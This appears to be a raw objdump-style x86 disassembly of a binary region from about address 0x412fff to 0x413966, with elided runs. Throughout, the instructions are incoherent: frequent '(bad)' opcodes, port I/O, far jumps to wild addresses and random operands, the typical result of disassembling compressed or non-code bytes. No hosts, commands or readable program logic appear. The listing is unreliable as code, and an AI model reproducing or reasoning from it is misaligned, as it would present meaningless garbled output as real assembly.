  412fff:	sbb    ah,al
  413001:	scas   eax,DWORD PTR es:[edi]
  413002:	jno    0x412fbb
  413004:	sbb    DWORD PTR [ebp+0xbf71],ebp
	...
  41301a:	sbb    ebp,ebx
  41301c:	sbb    esi,DWORD PTR [eax+eax*4-0x56f93fbd]
  413023:	adc    ah,BYTE PTR [ebp-0x1b06abfc]
  413029:	add    edi,edx
  41302b:	jg     0x413061
  41302d:	stc    
  41302e:	xchg   esp,eax
  41302f:	push   ds
  413030:	retf   
  413031:	mov    ?,WORD PTR [ecx]
  413033:	jmp    0x98c5b158
  413038:	(bad)  
  413039:	mov    ?,WORD PTR [ecx]
  41303b:	jmp    0xf9d0bf00
  413040:	in     al,0x3
  413042:	cli    
  413043:	jnp    0x413019
  413045:	fbld   TBYTE PTR [ecx]
  413047:	jl     0x412ff5
  413049:	fbld   TBYTE PTR ds:0x5dfbc7c
  41304f:	retf   0xf141
  413052:	jbe    0x413066
  413054:	mov    esp,0xed1dbd06
  413059:	mov    ?,WORD PTR [edi-0x7]
  41305c:	(bad)  
  41305d:	in     al,dx
  41305e:	stc    
  41305f:	add    al,0x53
  413061:	cdq    
  413062:	jl     0x4130a4
  413064:	out    0x5f,eax
  413066:	rcl    BYTE PTR [edx],1
  413068:	(bad)  
  413069:	push   ds
  41306a:	jnp    0x413062
  41306c:	add    ebp,ecx
  41306e:	stc    
  41306f:	xchg   esi,edi
  413071:	fimul  WORD PTR [ebp-0x61700e2]
  413077:	int    0x7b
  413079:	lds    esp,FWORD PTR ds:0x88503
	...
  41308f:	add    cl,bh
  413091:	add    al,0x0
  413093:	bound  ebx,QWORD PTR [ebp+0x337253e5]
  413099:	(bad)  
  41309b:	ins    BYTE PTR es:[edi],dx
  41309c:	cli    
  41309d:	(bad)  
  41309e:	cmp    ch,BYTE PTR [esi-0x5974fc98]
  4130a4:	xchg   BYTE PTR [esi+0x43],bh
  4130a7:	or     eax,0x12ea7eca
  4130ac:	adc    edi,DWORD PTR [ecx-0x1a3d9bb1]
  4130b2:	cmp    ebx,DWORD PTR [eax]
  4130b4:	jg     0x4130f5
  4130b6:	mov    BYTE PTR ds:0x17e7e59a,dl
  4130bc:	in     eax,dx
  4130bd:	adc    bh,dh
  4130bf:	shr    BYTE PTR [ebp-0x1b],1
  4130c2:	xor    ebx,DWORD PTR [ebx]
  4130c4:	stos   BYTE PTR es:[edi],al
  4130c5:	jle    0x41311a
  4130c7:	int    0xa9
  4130c9:	mov    edx,0x2a307251
  4130ce:	out    0x78,al
  4130d0:	adc    edx,DWORD PTR [ebx]
  4130d2:	mov    al,BYTE PTR [ecx+0x2123c57f]
  4130d8:	stos   DWORD PTR es:[edi],eax
  4130d9:	ror    DWORD PTR [edx-0xfc5f1d1],0x56
  4130e0:	repz into 
  4130e2:	les    esp,FWORD PTR [edx-0x5e]
  4130e5:	in     eax,0x13
  4130e7:	add    BYTE PTR ds:0xf74c8915,bh
  4130ed:	cmp    BYTE PTR [ecx-0x78caf8ac],cl
  4130f3:	dec    esp
	...
  413104:	add    BYTE PTR [eax],al
  413106:	div    DWORD PTR [eax]
  413108:	xchg   DWORD PTR [edi+esi*1+0x39],edx
  41310c:	mov    DWORD PTR [edi+esi*1+0x15],eax
  413110:	push   ebp
  413111:	push   ebp
  413112:	push   ebx
  413113:	or     ah,0xe8
  413116:	rcr    dh,cl
  413118:	std    
  413119:	dec    DWORD PTR [eax+0x6438223c]
  41311f:	push   esi
  413120:	mov    esi,ecx
  413122:	pop    eax
  413123:	loope  0x41310b
  413125:	mov    ds:0x3bfdedf2,eax
  41312a:	xchg   esi,eax
  41312b:	ja     0x413165
  41312d:	mov    edx,DWORD PTR [edi]
  41312f:	and    eax,0x30653b36
  413134:	add    al,BYTE PTR [eax]
  413136:	jecxz  0x4131b7
  413138:	pop    es
  413139:	cmp    DWORD PTR [ebp+0x1c],0x2
  41313d:	add    bl,dl
  41313f:	add    al,0x74
  413141:	sbb    BYTE PTR [esi-0x5cfffafc],ch
  413147:	js     0x41314c
  413149:	sbb    DWORD PTR [edx+ecx*1+0x74],0x19
  41314e:	mov    esi,0xa3007d04
  413153:	js     0x413158
  413155:	cmp    DWORD PTR [ecx+ecx*1+0x74],0xd
  41315a:	in     al,0x58
  41315c:	mov    esi,ecx
  41315e:	imul   esp,ecx,0xffffffef
  413161:	(bad)  
  413162:	in     al,dx
  413163:	cmp    ch,bh
  413165:	jmp    0x4131aa
  413167:	sub    DWORD PTR [edx+0x24],0x0
	...
  41317a:	add    BYTE PTR [eax],al
  41317c:	arpl   WORD PTR [edi],cx
  41317e:	(bad)  
  41317f:	call   DWORD PTR [ebx+0x4]
  413182:	mov    edx,ebx
  413184:	cli    
  413185:	add    dh,BYTE PTR [ecx]
  413187:	push   ecx
  413188:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413189:	mov    ds:0xb83de748,al
  41318e:	pop    ss
  41318f:	(bad)  
  413190:	mov    bh,0x9a
  413192:	daa    
  413193:	add    BYTE PTR [edi-0x29947638],ch
  413199:	sub    eax,0x51de438b
  41319e:	ret    
  41319f:	inc    edi
  4131a0:	jae    0x4131f4
  4131a2:	ficom  WORD PTR [edi-0x2f]
  4131a5:	aad    0x7
  4131a7:	add    BYTE PTR [ebp-0xa],0x17
  4131ab:	(bad)  
  4131ac:	jg     0x4131b5
  4131ae:	or     BYTE PTR [esi+ebx*2+0x7900021e],al
  4131b5:	push   ss
  4131b6:	add    BYTE PTR [edi],cl
  4131b8:	je     0x413154
  4131ba:	add    al,BYTE PTR [eax]
  4131bc:	cli    
  4131bd:	xchg   edx,eax
  4131be:	(bad)  
  4131bf:	and    ecx,DWORD PTR [edx]
  4131c1:	xlat   BYTE PTR ds:[ebx]
  4131c2:	mov    al,dl
  4131c4:	and    DWORD PTR [edi-0x4d],ebx
  4131c7:	push   eax
  4131c8:	sub    DWORD PTR [edi+0x2b],0x1646d42e
  4131cf:	mov    ah,BYTE PTR [esi]
  4131d1:	or     bl,ah
  4131d3:	push   esi
  4131d4:	dec    eax
  4131d5:	mov    ds:0x45a28a45,eax
  4131da:	add    al,0xf1
  4131dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4131dd:	data16 fcmovb st,st(4)
	...
  4131f0:	add    BYTE PTR [eax],al
  4131f2:	sbb    eax,0xde438ae9
  4131f7:	xor    eax,0x29d685d9
  4131fc:	add    al,BYTE PTR [eax]
  4131fe:	unpckhps xmm0,XMMWORD PTR [ecx+0x229d2bd]
  413205:	add    dl,bh
  413207:	adc    edx,edi
  413209:	cmp    al,0xfa
  41320b:	sub    BYTE PTR [edx],al
  41320d:	add    dh,ah
  41320f:	add    al,0xec
  413211:	sbb    BYTE PTR [edx+eax*1-0x2b],0xdf
  413216:	push   ss
  413217:	add    eax,0x90fa03d4
  41321c:	jecxz  0x4131a0
  41321e:	inc    esp
  41321f:	add    edi,DWORD PTR [ebp+0x71b4a4fb]
  413225:	inc    esi
  413226:	sbb    eax,0x2c1737bd
  41322b:	sbb    esi,esi
  41322d:	mov    eax,0x4c69afc0
  413232:	sbb    al,0xae
  413234:	imul   eax,DWORD PTR [eax-0x33],0x8103f042
  41323b:	mov    al,ds:0x4370f3c4
  413240:	sar    DWORD PTR [esi],1
  413242:	lods   eax,DWORD PTR ds:[esi]
  413243:	mov    ecx,0xeedd4671
  413248:	push   es
  413249:	pop    ss
  41324a:	in     al,dx
  41324b:	enter  0x2769,0xfa
  41324f:	xchg   edi,eax
  413250:	shr    DWORD PTR [edx],cl
  413252:	in     eax,dx
  413253:	jns    0x413289
  413255:	loopne 0x413257
	...
  413267:	add    BYTE PTR ds:0x2a172180,al
  41326d:	mov    bl,0x61
  41326f:	inc    ebp
  413270:	fld    QWORD PTR [esi]
  413272:	xlat   BYTE PTR ds:[ebx]
  413273:	push   ss
  413274:	mov    esp,0x49e03c7a
  413279:	push   eax
  41327a:	out    0x3,eax
  41327c:	cli    
  41327d:	add    al,0xf2
  41327f:	ss sub ah,ah
  413282:	jae    0x4132fe
  413284:	popf   
  413285:	push   cs
  413286:	call   0xfcc8b38e
  41328b:	dec    DWORD PTR [ebp+0x70b4390e]
  413291:	aas    
  413292:	nop
  413293:	and    BYTE PTR [esi-0x5bfb82f2],cl
  413299:	stc    
  41329a:	(bad)  
  41329b:	in     al,dx
  41329c:	stc    
  41329d:	add    al,0x3
  41329f:	mov    WORD PTR [eax+0x2f],es
  4132a2:	jno    0x4132f0
  4132a4:	js     0x4132e1
  4132a6:	(bad)  
  4132a7:	call   0xe9451c7b
  4132ac:	stc    
  4132ad:	jg     0x4132f9
  4132af:	loopne 0x41331b
  4132b1:	in     eax,dx
  4132b2:	mov    ch,BYTE PTR [edi+0x49]
  4132b5:	add    al,BYTE PTR [eax]
  4132b7:	jmp    0xed58bb42
  4132bc:	stc    
  4132bd:	add    al,0x40
  4132bf:	pusha  
  4132c0:	jg     0x4132ac
  4132c2:	add    ebp,ecx
  4132c4:	stc    
  4132c5:	jnp    0x41324c
  4132c7:	stc    
  4132c8:	adc    eax,0x62fe0e
	...
  4132dd:	add    BYTE PTR [edi-0x616fc0b],cl
  4132e3:	jp     0x4132f4
  4132e5:	jmp    0x4132b2
  4132e7:	xadd   DWORD PTR [ecx-0x17],esi
  4132eb:	add    al,0x9e
  4132ed:	aad    0xed
  4132ef:	or     eax,0x7ae674fe
  4132f4:	test   ecx,edi
  4132f6:	fisttp QWORD PTR ds:0xf65470fe
  4132fc:	add    ebp,ecx
  4132fe:	stc    
  4132ff:	les    ecx,FWORD PTR [eax+0x1c25f]
  413305:	jmp    0xe550ba7a
  41330a:	stc    
  41330b:	add    al,0x8b
  41330d:	outs   dx,DWORD PTR ds:[esi]
  41330e:	scas   al,BYTE PTR es:[edi]
  41330f:	add    DWORD PTR [eax],eax
  413311:	jmp    0xbb433089
  413316:	add    al,0x44
  413318:	xchg   ecx,edi
  41331a:	clc    
  41331b:	outs   dx,BYTE PTR ds:[esi]
  41331c:	sbb    ebp,ebp
  41331e:	stc    
  41331f:	add    al,0x75
  413321:	lock jb 0x4132ab
  413324:	str    WORD PTR [edi-0x2276ffff]
  41332b:	adc    BYTE PTR [edx],al
  41332d:	add    BYTE PTR [ebx+0x41],ah
  413330:	xchg   DWORD PTR [esi-0x1f2c9],ecx
  413336:	jmp    0x8b01:0x63040e8e
  41333d:	xchg   BYTE PTR [ebx+0xd],cl
  413340:	(bad)  
  413341:	inc    DWORD PTR [eax]
	...
  413353:	add    BYTE PTR [ebx],al
  413355:	sub    DWORD PTR [ecx-0x1f2dc7a],ecx
  41335b:	(bad)  
  41335c:	fisttp QWORD PTR [eax]
  41335e:	add    BYTE PTR [ebx+0x20c95],cl
  413364:	adc    edi,DWORD PTR [esp+eax*4+0x18]
  413368:	sgdtd  [eax]
  41336b:	add    ebp,eax
  41336d:	sbb    BYTE PTR [edx],al
  41336f:	add    BYTE PTR [ebx],ah
  413371:	sbb    al,0xcb
  413373:	shl    BYTE PTR [ebx],cl
  413375:	jl     0x4133b9
  413377:	and    al,0x57
  413379:	mov    ?,WORD PTR [esi+0x4a7db274]
  41337f:	and    al,0x83
  413381:	jge    0x413317
  413383:	adc    bh,bl
  413385:	or     BYTE PTR [eax],al
  413387:	sub    ebx,DWORD PTR [edi]
  413389:	and    eax,0x8248514e
  41338e:	adc    al,BYTE PTR [ebx+eiz*8]
  413391:	or     BYTE PTR [ebx],ch
  413393:	dec    esp
  413394:	call   DWORD PTR [eax+0x50]
  413397:	push   ecx
  413398:	fdivr  st(1),st
  41339a:	into   
  41339b:	sbb    DWORD PTR [edi+0x18],0xffffff83
  41339f:	shr    dh,0xfc
  4133a2:	pop    esp
  4133a3:	mov    edx,DWORD PTR [eax+0x4d]
  4133a6:	pop    ebp
  4133a7:	pop    esi
  4133a8:	adc    ah,cl
  4133aa:	ss ret 0xfb
  4133ae:	mov    eax,DWORD PTR [esi-0x1f206]
  4133b4:	test   DWORD PTR [edi-0x42],eax
  4133b7:	and    eax,DWORD PTR [eax]
	...
  4133c9:	add    BYTE PTR [edx],ch
  4133cb:	loope  0x413385
  4133cd:	pop    esi
  4133ce:	aam    0x9e
  4133d0:	ds aaa 
  4133d2:	cmp    BYTE PTR [esi],dh
  4133d4:	add    bh,BYTE PTR [eax+0x81dfa]
  4133da:	cmp    DWORD PTR [edi-0x6901dc42],edx
  4133e0:	dec    edx
  4133e1:	shl    BYTE PTR [ebx+0x1f],0x85
  4133e5:	inc    ebx
  4133e6:	repnz pop ebp
  4133e8:	aas    
  4133e9:	mov    dh,BYTE PTR [esi+0x268107f9]
  4133ef:	cli    
  4133f0:	(bad)  
  4133f1:	(bad)  
  4133f2:	cli    
  4133f3:	cwde   
  4133f4:	inc    edx
  4133f5:	je     0x4133f4
  4133f7:	pushf  
  4133f8:	ds sub esi,esi
  4133fb:	sbb    eax,0x9a81c302
  413400:	fiadd  WORD PTR [ebx-0xa]
  413403:	sbb    eax,0x426e8b02
  413408:	ret    0xfa03
  41340b:	sbb    eax,0x41868ab1
  413410:	ret    0xfa03
  413413:	sbb    eax,0x418e8ab0
  413418:	(bad)  
  413419:	add    edi,edx
  41341b:	sbb    eax,0xa1814fb3
  413420:	out    0x3f,eax
  413422:	neg    BYTE PTR ds:0xa92a5202
  413428:	mov    edi,0xb335e223
  41342d:	hlt    
	...
  41343e:	add    BYTE PTR [eax],al
  413440:	mov    ch,0x4a
  413442:	test   bl,al
  413444:	ficomp WORD PTR [ecx]
  413446:	add    al,BYTE PTR [eax]
  413448:	mov    ecx,0xaecb3f69
  41344d:	add    al,0xb5
  41344f:	inc    eax
  413450:	sar    DWORD PTR [eax],0xac
  413453:	inc    eax
  413454:	sar    DWORD PTR [eax],0x3b
  413457:	jge    0x4133f7
  413459:	test   DWORD PTR [esp+edx*1+0x7d],edi
  41345d:	or     ebp,eax
  41345f:	mov    dh,0xcf
  413461:	mov    bl,0x71
  413463:	mov    ecx,0x391d5f5
  413468:	lods   al,BYTE PTR ds:[esi]
  413469:	push   edi
  41346a:	push   esp
  41346b:	ret    0x4ba
  41346e:	jo     0x413484
  413470:	cmp    cl,BYTE PTR [ecx+ebp*8]
  413473:	add    al,BYTE PTR [eax+eax*1-0x78b58307]
  41347a:	inc    edi
  41347b:	or     ebp,ebp
  41347d:	push   ebx
  41347e:	je     0x41347d
  413480:	fnstcw WORD PTR [edx+0x3c7703a7]
  413486:	in     eax,0x78
  413488:	dec    edx
  413489:	sti    
  41348a:	jbe    0x4134d1
  41348c:	jne    0x41344e
  41348e:	add    edi,DWORD PTR [eax+edi*4]
  413491:	xchg   DWORD PTR [ecx],esp
  413493:	int3   
  413494:	xchg   ecx,eax
  413495:	xor    eax,0x879f35d7
  41349a:	mov    edi,edi
  41349c:	cli    
  41349d:	xchg   ecx,eax
  41349e:	bnd jl 0x413466
  4134a1:	adc    ah,BYTE PTR [eax]
  4134a3:	add    DWORD PTR [eax],0x0
	...
  4134b5:	add    BYTE PTR [ecx+0x5],al
  4134b8:	xlat   BYTE PTR ds:[ebx]
  4134b9:	push   ds
  4134ba:	clc    
  4134bb:	ja     0x413499
  4134bd:	cmc    
  4134be:	outs   dx,BYTE PTR ds:[esi]
  4134bf:	mov    edi,fs
  4134c1:	xchg   BYTE PTR [ecx-0x33ed07b8],bl
  4134c7:	or     ch,al
  4134c9:	xchg   BYTE PTR [ecx-0x43ed0788],bl
  4134cf:	or     ch,al
  4134d1:	aam    0xd0
  4134d3:	cli    
  4134d4:	jbe    0x41345b
  4134d6:	sar    DWORD PTR [ebx+0x77fe27ff],0x33
  4134dd:	shl    DWORD PTR [eax+ecx*1+0x1b],1
  4134e1:	and    al,0x94
  4134e3:	jl     0x413528
  4134e5:	aam    0xd1
  4134e7:	add    DWORD PTR [ebx-0xc],0x63071f09
  4134ee:	mov    ch,0xd1
  4134f0:	stos   DWORD PTR es:[edi],eax
  4134f1:	jno    0x413530
  4134f3:	jmp    0xfb65f87
  4134f8:	sbb    esi,ebp
  4134fa:	push   ss
  4134fb:	dec    edi
  4134fc:	sbb    ebp,ecx
  4134fe:	stc    
  4134ff:	add    al,0xf
  413501:	lahf   
  413502:	jg     0x413542
  413504:	dec    ebp
  413505:	test   al,0xf9
  413507:	ja     0x41353c
  413509:	icebp  
  41350a:	jl     0x413514
  41350c:	aaa    
  41350d:	int3   
  41350e:	aas    
  41350f:	jl     0x413554
  413511:	cld    
  413512:	icebp  
  413513:	add    DWORD PTR [ebx-0x24],0x63071ea9
	...
  41352a:	add    BYTE PTR [eax],al
  41352c:	cmp    eax,0x3561abd1
  413531:	jmp    0xfbddfc5
  413536:	aaa    
  413537:	popf   
  413538:	(bad)  
  41353a:	(bad)  
  41353c:	mov    ds:0x369fdb86,eax
  413541:	or     bh,BYTE PTR [esi-0x7b]
  413544:	add    dh,BYTE PTR [ebp-0x1]
  413547:	je     0x413544
  413549:	jge    0x41354e
  41354b:	push   esp
  41354c:	int    0xb7
  41354e:	inc    eax
  41354f:	jmp    0xf9cdbb32
  413554:	jmp    0xf387:0x33eefe0a
  41355b:	daa    
  41355c:	mov    ecx,0xf54d7e09
  413561:	je     0x413562
  413563:	push   edi
  413565:	push   es
  413566:	mov    eax,DWORD PTR [esi+ecx*2]
  413569:	sub    eax,0xe93414c
  41356e:	cmp    BYTE PTR [ebp-0x20b3d],0xe0
  413575:	jg     0x413570
  413577:	sbb    bh,ch
  413579:	ret    0x8340
  41357c:	imul   edx,DWORD PTR [eax],0xf4a98c0d
  413582:	std    
  413583:	(bad)  
  413584:	out    dx,al
  413585:	or     DWORD PTR [esi],0x4ef3ecff
  41358b:	call   0x413aea
	...
  4135a0:	add    BYTE PTR [eax],al
  4135a2:	in     al,dx
  4135a3:	push   esi
  4135a4:	pop    ecx
  4135a5:	mov    DWORD PTR [edi+0x6308c059],ebp
  4135ab:	push   edx
  4135ac:	xchg   ebp,esp
  4135ae:	shl    ah,cl
  4135b0:	jle    0x4135b2
  4135b2:	push   ebx
  4135b3:	add    eax,0x88945653
  4135b8:	inc    ebx
  4135b9:	or     BYTE PTR [esi+0x43b97e51],bl
  4135bf:	add    eax,0xbf9a0000
  4135c4:	add    eax,0x81318827
  4135ca:	cmc    
  4135cb:	add    BYTE PTR [eax],al
  4135cd:	cld    
  4135ce:	adc    eax,esi
  4135d0:	in     al,0x6
  4135d2:	cwde   
  4135d3:	aaa    
  4135d4:	jg     0x4135bd
  4135d6:	and    eax,DWORD PTR [esi]
  4135d8:	add    BYTE PTR [eax],al
  4135da:	and    bl,dh
  4135dc:	or     BYTE PTR [ecx],cl
  4135de:	in     eax,dx
  4135df:	mov    DWORD PTR [esi],esi
  4135e1:	xor    esp,0xe3fc0000
  4135e7:	ret    
  4135e8:	in     eax,dx
  4135e9:	or     cl,dl
  4135eb:	test   BYTE PTR [edi+0x38a4fa32],0x82
  4135f2:	mov    eax,0x7b377b22
  4135f7:	aaa    
  4135f8:	inc    edx
  4135f9:	push   cs
  4135fa:	cli    
  4135fb:	sbb    eax,0x22fcee41
  413600:	ror    BYTE PTR [eax-0x7f2c5d24],1
	...
  413616:	add    BYTE PTR [eax],al
  413618:	pushf  
  413619:	push   ds
  41361a:	adc    al,BYTE PTR [edx]
  41361c:	cli    
  41361d:	pop    esp
  41361e:	sub    BYTE PTR [ebx],cl
  413620:	jno    0x413635
  413622:	and    edx,0xffffffbd
  413625:	pop    esp
  413626:	and    ecx,DWORD PTR [edi]
  413628:	add    esp,DWORD PTR [eax+0x7b]
  41362b:	pop    ss
  41362c:	jnp    0x4136a9
  41362e:	add    dh,al
  413630:	stc    
  413631:	sbb    eax,0x24f6ea41
  413636:	xor    BYTE PTR [eax-0x7dcc6af8],cl
  41363c:	cmp    BYTE PTR [edx],ah
  41363e:	jnp    0x41366f
  413640:	jns    0x4135fa
  413642:	iret   
  413643:	or     cl,BYTE PTR [ecx]
  413645:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413646:	ror    DWORD PTR [eax+0x79],cl
  413649:	fiadd  WORD PTR [esi]
  41364b:	test   DWORD PTR [ebx+0x51],eax
  41364e:	mov    BYTE PTR [edi+edi*4-0x2a184d63],cl
  413655:	sbb    eax,0x3fb50002
  41365a:	stos   DWORD PTR es:[edi],eax
  41365b:	mov    BYTE PTR [esi],bl
  41365d:	dec    ecx
  41365e:	inc    esp
  41365f:	add    edi,edx
  413661:	mov    ds:0xb3f623c6,al
  413666:	jle    0x4136b3
  413668:	cmp    ebx,DWORD PTR [esi]
  41366a:	jnp    0x413675
  41366c:	adc    DWORD PTR ds:0x9afec183,0x42
  413673:	add    edi,DWORD PTR [ebx+0x13]
  413676:	std    
  413677:	dec    esp
  413678:	cmp    eax,DWORD PTR ds:0x91e9
	...
  41368e:	fild   WORD PTR [edx-0x1c]
  413691:	add    esi,DWORD PTR [ecx-0x40]
  413694:	or     al,0x8
  413696:	cmp    BYTE PTR [eax+0x1c],0xc5
  41369a:	mov    ch,0x7a
  41369c:	lock jl 0x4136a2
  41369f:	test   BYTE PTR [eax-0x13bd86f8],ch
  4136a5:	test   BYTE PTR [ebx-0x6a3ae408],ah
  4136ab:	xchg   ebp,eax
  4136ac:	xchg   esi,eax
  4136ad:	inc    edx
  4136ae:	stc    
  4136af:	add    al,0x34
  4136b1:	jge    0x413651
  4136b3:	mov    ah,0x38
  4136b5:	mov    bl,0x70
  4136b7:	shl    eax,0x7a
  4136ba:	(bad)  
  4136bb:	clc    
  4136bc:	jae    0x413677
  4136be:	gs mov dl,0x18
  4136c1:	sbb    al,0x4
  4136c3:	add    eax,0x78d203e9
  4136c8:	sbb    al,0xc5
  4136ca:	push   ebp
  4136cb:	js     0x413678
  4136cd:	or     edi,DWORD PTR [ebp-0x5fbd0e4]
  4136d3:	add    al,0xba
  4136d5:	xor    BYTE PTR [esi-0x5ae447f4],0x4
  4136dc:	jmp    0x4cbf07e4
  4136e1:	mov    cl,0x3b
  4136e3:	cld    
  4136e4:	call   0x501a79b
  4136e9:	cld    
  4136ea:	xor    BYTE PTR [eax+0x4582ffcc],0xa8
  4136f1:	inc    BYTE PTR [eax]
	...
  413703:	add    BYTE PTR [edi-0x3],cl
  413706:	daa    
  413707:	and    eax,0x7ce27de5
  41370c:	mov    edx,0x255f5c5
  413711:	inc    esp
  413712:	pop    es
  413713:	hlt    
  413714:	lock cli 
  413716:	call   FWORD PTR [edi-0x20]
  413719:	jge    0x4136db
  41371b:	test   eax,0xa80850d4
  413720:	push   ss
  413721:	dec    BYTE PTR [edx]
  413723:	repz inc esi
  413725:	cld    
  413726:	mov    BYTE PTR [eax+0x60034478],bh
  41372c:	cmp    dh,al
  41372e:	push   cs
  41372f:	jg     0x4136d1
  413731:	std    
  413732:	sbb    BYTE PTR [eax+0x3e],dh
  413735:	(bad)  
  413736:	push   cs
  413737:	jg     0x4136d7
  413739:	inc    ebp
  41373a:	loopne 0x41370d
  41373c:	push   ss
  41373d:	cld    
  41373e:	mov    BYTE PTR [eax-0xf4a0847],ch
  413744:	ds and eax,0x7d83e20f
  41374a:	or     DWORD PTR [eax-0x42],esp
  41374d:	lds    ecx,FWORD PTR [esi]
  41374f:	aas    
  413750:	outs   dx,BYTE PTR ds:[esi]
  413751:	inc    ebp
  413752:	loopne 0x413745
  413754:	pusha  
  413755:	cld    
  413756:	push   cs
  413757:	aas    
  413758:	stc    
  413759:	sti    
  41375a:	shl    BYTE PTR [eax+0x53],0xab
  41375e:	shl    ecx,0xf9
  413761:	mov    cl,0x8a
  413763:	mov    ch,0x5d
  413765:	dec    BYTE PTR [edx+0xa5]
	...
  413777:	add    BYTE PTR [eax],al
  413779:	add    BYTE PTR [ebp-0x6],dl
  41377c:	mov    ch,bl
  41377e:	mov    esi,0xf671171d
  413783:	ret    
  413784:	mov    ch,bl
  413786:	mov    esi,0xf6610f1d
  41378b:	ret    
  41378c:	mov    ch,bl
  41378e:	mov    esi,0xf671071d
  413793:	ret    
  413794:	mov    BYTE PTR [edx],dh
  413796:	ds jge 0x413768
  413799:	push   0xffffffbb
  41379b:	add    DWORD PTR [ebx-0x74fc8e17],ecx
  4137a1:	add    cl,ah
  4137a3:	shl    dh,0x18
  4137a6:	imul   eax,DWORD PTR [ecx],0x41
  4137a9:	mov    edx,ecx
  4137ab:	shl    dh,0x10
  4137ae:	pop    ebx
  4137af:	add    DWORD PTR [ecx-0x75],eax
  4137b2:	loope  0x413776
  4137b4:	out    0x8,al
  4137b6:	dec    ebx
  4137b7:	add    al,BYTE PTR [ecx-0x75]
  4137ba:	ror    DWORD PTR [ecx+0x5ca288ce],0xc0
  4137c1:	or     BYTE PTR [ebx+0x10e5874e],ah
  4137c7:	in     eax,0xa
  4137c9:	push   ebx
  4137ca:	std    
  4137cb:	dec    edi
  4137cc:	mov    DWORD PTR [ebp-0x49],eax
  4137cf:	mov    WORD PTR [ebx+0x8],ss
  4137d2:	or     BYTE PTR [ebx],dl
  4137d4:	mov    DWORD PTR [ebp-0x75],ecx
  4137d7:	mov    WORD PTR [edi+0x4],es
  4137da:	sbb    dl,ah
  4137dc:	mov    edi,0xeb
	...
  4137ed:	add    BYTE PTR [eax],al
  4137ef:	add    BYTE PTR [edi+0x32],bl
  4137f2:	leave  
  4137f3:	add    DWORD PTR [eax+0x540f0d07],0x8589d732
  4137fd:	shl    esp,0x4
  413800:	xchg   edx,eax
  413801:	repz xchg esi,edx
  413804:	and    ah,bh
  413806:	push   cs
  413807:	xor    DWORD PTR ds:0xb081f18a,edx
  41380d:	idiv   ebp
  41380f:	add    BYTE PTR [ebx],ah
  413811:	xor    dl,bh
  413813:	mov    ebp,edx
  413815:	shl    esp,0x10
  413818:	and    dh,bl
  41381a:	xchg   esi,ecx
  41381c:	shl    dh,cl
  41381e:	add    BYTE PTR [ecx],dh
  413820:	in     eax,dx
  413821:	mov    ecx,esi
  413823:	add    DWORD PTR [eax],0x20333134
  413829:	xor    bl,al
  41382b:	mov    edx,edi
  41382d:	int    0x42
  41382f:	in     eax,0xf8
  413831:	fcom   QWORD PTR [edx]
  413833:	mov    BYTE PTR [ebp+ebp*1+0x1c2b071e],bh
  41383a:	jns    0x41382e
  41383c:	jnp    0x41384d
  41383e:	or     edi,edi
  413840:	aam    0xee
  413842:	rcr    cl,cl
  413844:	or     esp,0x42
  413847:	in     eax,0xf2
  413849:	sbb    al,0x3e
  41384b:	mov    BYTE PTR [edi-0x26],al
  41384e:	add    dh,dh
  413850:	adc    DWORD PTR [ecx+0x10],0xc0
	...
  413863:	add    BYTE PTR [eax],al
  413865:	add    BYTE PTR [ebp-0x4197f15],bl
  41386b:	je     0x41387f
  41386d:	or     BYTE PTR [ebx-0x3bcfcc9b],ah
  413873:	adc    BYTE PTR gs:[eax-0x56a8a767],al
  41387a:	push   eax
  41387b:	frstor [edi]
  41387d:	xor    BYTE PTR [ebx-0x7cee2a97],ah
  413883:	mov    ebx,0x6f0dee42
  413888:	and    al,0x0
  41388a:	jae    0x41380c
  41388c:	cli    
  41388d:	stc    
  41388e:	xor    eax,0xfa070c31
  413893:	in     eax,dx
  413894:	add    DWORD PTR [ecx+0x1b232d3c],ecx
  41389a:	jae    0x4138cf
  41389c:	inc    edx
  41389d:	out    dx,al
  41389e:	mul    BYTE PTR [eax+edx*1+0x8]
  4138a2:	xor    DWORD PTR [ebp+0x43],esp
  4138a5:	cmp    BYTE PTR [edx],0xf2
  4138a8:	rcr    BYTE PTR ds:0xe5802473,1
  4138ae:	frstor [esi-0x2b]
  4138b1:	mov    ah,0x6
  4138b3:	cdq    
  4138b4:	ret    0x82ff
  4138b7:	add    eax,0xb144246
  4138bc:	push   0xe7050124
  4138c1:	add    eax,DWORD PTR [ecx]
  4138c3:	mov    esp,0x53ab0db
  4138c8:	jo     0x4138f6
	...
  4138da:	add    BYTE PTR [eax],al
  4138dc:	mov    edx,0xd482edf3
  4138e1:	add    al,ch
  4138e3:	add    edi,edx
  4138e5:	(bad)  
  4138e7:	jmp    FWORD PTR [edx]
  4138e9:	inc    esi
  4138ea:	out    0x7c,eax
  4138ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4138ed:	(bad)
  4138f0:	jp     0x4138dd
  4138f2:	rol    DWORD PTR [edx+edi*8],cl
  4138f5:	add    al,0xe2
  4138f7:	push   edx
  4138f8:	add    DWORD PTR [eax+ebp*1+0x4],edx
  4138fc:	jae    0x413977
  4138fe:	mov    bl,0x7d
  413900:	mov    bh,0x87
  413902:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413903:	add    BYTE PTR [ebx-0x7d160531],al
  413909:	loop   0x413975
  41390b:	and    al,ah
  41390d:	(bad)  
  41390e:	rcl    DWORD PTR [eax-0xf],cl
  413911:	pop    edx
  413912:	sub    BYTE PTR [ecx+eax*1],al
  413915:	jp     0x4138aa
  413917:	jge    0x413965
  413919:	lds    edx,FWORD PTR [esi+0x7beb7b02]
  41391f:	add    al,0xfa
  413921:	add    al,0xe2
  413923:	push   edx
  413924:	add    DWORD PTR [ecx+0x28],ebx
  413927:	add    al,0x83
  413929:	jecxz  0x413953
  41392b:	sbb    esi,edi
  41392d:	test   DWORD PTR [esi+0x8],eax
  413930:	cmp    eax,0x6cfee803
  413935:	adc    BYTE PTR [ecx+0x268c2dc4],bh
  41393b:	inc    ebp
  41393c:	adc    al,0x1a
  41393e:	push   0x23
	...
  41394f:	add    BYTE PTR [eax],al
  413951:	add    BYTE PTR [ecx],ah
  413953:	add    al,0x0
  413955:	jmp    0xddf64953
  41395a:	dec    ecx
  41395b:	inc    esp
  41395c:	add    al,bl
  41395e:	out    dx,eax
  41395f:	mov    esi,ss
  413961:	sub    al,bl
  413963:	pop    ds
  413964:	xchg   DWORD PTR [esi],edi
  413966:	aas    
